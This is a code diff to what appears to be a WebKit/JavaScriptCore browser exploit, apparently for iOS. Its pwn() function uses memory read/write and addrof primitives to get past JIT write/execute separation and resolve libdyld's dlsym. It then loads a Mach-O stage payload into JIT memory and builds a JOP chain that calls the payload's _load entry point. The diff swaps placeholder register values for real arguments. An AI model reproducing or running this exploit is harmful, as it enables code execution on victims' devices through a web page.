@@ -225,6 +225,9 @@ function pwn() {
     var libdyld_base = Sub(webcore_base, offsets.LIBDYLD_BASE);
     log(`[+] libdyld base = ${(libdyld_base)} -> ${read64(libdyld_base)}`);
 
+    // needed arguments to call stage1's _load
+    var dlsym = Add(libdyld_base, 0x4A08);
+
     // needed to bypass seperated RW, RX JIT mitigation
     var __MergedGlobals_52 = read64(Add(jsc_base, offsets.__MergedGlobals_52));
     var memPoolStart = read64(Add(__MergedGlobals_52, offsets.memPoolStart));    //__MergedGlobals_52 + 0xc8
@@ -275,23 +278,23 @@ function pwn() {
     write64(x8, longjmp);
     log(`[i] writechk ${read64(x8)}`);
     
-    stage1.u32 = _u32;
-    stage1.read = _read;
-    stage1.readInt64 = _readInt64;
-    stage1.writeInt64 = _writeInt64;
+    stages.u32 = _u32;
+    stages.read = _read;
+    stages.readInt64 = _readInt64;
+    stages.writeInt64 = _writeInt64;
     var pstart = new Int64("0xffffffffffffffff");
     var pend   = new Int64(0);
-    var ncmds  = stage1.u32(0x10);
+    var ncmds  = stages.u32(0x10);
     for(var i = 0, off = 0x20; i < ncmds; ++i)
     {
-        var cmd = stage1.u32(off);
+        var cmd = stages.u32(off);
         if(cmd == 0x19) // LC_SEGMENT_64
         {
-            var filesize = stage1.readInt64(off + 0x30);
+            var filesize = stages.readInt64(off + 0x30);
             if(!(filesize.hi() == 0 && filesize.lo() == 0))
             {
-                var vmstart = stage1.readInt64(off + 0x18);
-                var vmsize = stage1.readInt64(off + 0x20);
+                var vmstart = stages.readInt64(off + 0x18);
+                var vmsize = stages.readInt64(off + 0x20);
                 var vmend = Add(vmstart, vmsize);
                 if(vmstart.hi() < pstart.hi() || (vmstart.hi() == pstart.hi() && vmstart.lo() <= pstart.lo()))
                 {
@@ -304,7 +307,7 @@ function pwn() {
                 }
             }
         }
-        off += stage1.u32(off + 0x4);
+        off += stages.u32(off + 0x4);
     }
     var shsz = Sub(pend, pstart);
     log(`pstart: ${pstart}, pend: ${pend}, shsz: ${shsz}`);
@@ -314,7 +317,7 @@ function pwn() {
     }
 
     var payload = new Uint8Array(shsz.lo());
-    var paddr = read64(Add(addrof(stage1), 0x10));
+    var paddr = read64(Add(addrof(stages), 0x10));
     // paddr = new Int64(paddr);
     var codeAddr = Sub(memPoolEnd, shsz);
     codeAddr = Sub(codeAddr, codeAddr.lo() & 0x3fff);
@@ -323,16 +326,16 @@ function pwn() {
     var off = 0x20;
     for(var i = 0; i < ncmds; ++i)
     {
-        var cmd = stage1.u32(off);
+        var cmd = stages.u32(off);
         if(cmd == 0x19) // LC_SEGMENT_64
         {
-            var filesize = stage1.readInt64(off + 0x30);
+            var filesize = stages.readInt64(off + 0x30);
             if(!(filesize.hi() == 0 && filesize.lo() == 0))
             {
-                var vmaddr   = stage1.readInt64(off + 0x18);
-                var vmsize   = stage1.readInt64(off + 0x20);
-                var fileoff  = stage1.readInt64(off + 0x28);
-                var prots    = stage1.readInt64(off + 0x38); // lo=init_prot, hi=max_prot
+                var vmaddr   = stages.readInt64(off + 0x18);
+                var vmsize   = stages.readInt64(off + 0x20);
+                var fileoff  = stages.readInt64(off + 0x28);
+                var prots    = stages.readInt64(off + 0x38); // lo=init_prot, hi=max_prot
                 if(vmsize.hi() < filesize.hi() || (vmsize.hi() == filesize.hi() && vmsize.lo() <= filesize.lo()))
                 {
                     filesize = vmsize;
@@ -353,17 +356,17 @@ function pwn() {
                 }
                 fileoff = fileoff.lo();
                 filesize = filesize.lo();
-                payload.set(stage1.slice(fileoff, fileoff + filesize), Sub(vmaddr, pstart).lo());
+                payload.set(stages.slice(fileoff, fileoff + filesize), Sub(vmaddr, pstart).lo());
             }
         }
-        off += stage1.u32(off + 0x4);
+        off += stages.u32(off + 0x4);
     }
     log(`codeAddr: ${codeAddr}, paddr: ${paddr}`)
 
     payload.u32 = _u32;
     payload.read = _read;
     payload.readInt64 = _readInt64;
-    var psyms = fsyms(payload, 0, segs, ["genesis"]);
+    var psyms = fsyms(payload, 0, segs, ["_load"]);
     
     ////////////////////////
     var arrsz = 0x100000,
@@ -539,11 +542,11 @@ function pwn() {
         , new Int64(100000) // microseconds
     );
 
-    var jmpAddr = Add(psyms["genesis"], shslide);
+    var jmpAddr = Add(psyms["_load"], shslide);
     add_call(jmpAddr
-        , new Int64(0xcafebabe41414140) //x0
-        , new Int64(0xcafebabe41414144) //x1
-        , new Int64(0xcafebabe41414148) //x2
+        , paddr //x0 payload addr
+        , dlsym //x1 dlsym
+        , memPoolEnd //x2 jitend
         , new Int64(0xcafebabe4141414c) //x3
         , new Int64(0xcafebabe41414150) //x4
     );
@@ -559,7 +562,7 @@ function pwn() {
     var sp = Add(stack, (arrsz - off) * 4);
     write64(Add(x19, 0x60), new Int64(sp));
 
-    alert("Done building JOP chain, executing stage1 payload!");
+    alert("Done building JOP chain, executing stages payload!");
 
     wrapper.addEventListener("click", function(){ }); 
 
